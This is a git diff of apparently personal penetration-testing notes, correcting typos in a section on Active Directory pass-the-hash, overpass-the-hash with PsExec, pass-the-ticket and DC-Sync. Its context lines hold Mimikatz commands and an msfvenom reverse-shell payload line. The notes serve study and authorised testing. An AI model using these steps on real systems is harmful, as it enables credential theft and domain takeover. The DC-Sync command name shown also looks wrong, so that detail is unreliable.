@@ -117,18 +117,18 @@ msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell_443.e
 - Usually the PTH technique does not work with Kerberos Authentication.
 - Different Applications provide different ways to use the PTH techniques.
     - MimiKatz toolkit has the `/pth:` for users to pass in the NTLM hashes.
-    - XFREERDP has the `/pth:` parameter in case you dont have the cleartext password.
+    - XFREERDP has the `/pth:` parameter in case you don't have the cleartext password.
 - Make sure hashes start with a colon in case things don't work out `':'`.
 
 **Converting a KerbTGT into a TGS & Use Any Service in the context of a different user:**
 1. Log into a system as `offsec` & get the cached NTLM of another user - `jen`.
 2. Now, use the `sekurlsa::pth` module to pass the hash and create a powershell session in the context of this new user - `jen`.
-3. Now use the `klist` command to see that no credentials are cached. To cache the KerbTGT, we will try to access some service as jen, but from the commandline.
+3. Now use the `klist` command to see that no credentials are cached. To cache the KerbTGT, we will try to access some service as jen, but from the command-line.
 4. Use the `\\web04` network file share using the `net use \\web04` command. Since the powershell session is running as jen, her **TGT and TGS** will be cached. This can be confirmed with `klist`.
 5. Once we have the TGS, this means we can use any service as jen. So we will use `.\PSExec \\web04 cmd` to gain shell as jen with high privs.
 **Passing the Ticket**
 - TGT is good for authenticating for gaining shells. However, it is TGS provides more flexibility. We can use the `sekurlsa::tickets /export` command to dump all the TGS tickets into the working directory.
-- Then you can simply use the `kerberos::ptt` command, and paste one of the ticket names which ends in the `.kirbi` extention.
+- Then you can simply use the `kerberos::ptt` command, and paste one of the ticket names which ends in the `.kirbi` extension.
 
 #### Understanding DC-Sync
 `sekurlsa::dcsync`
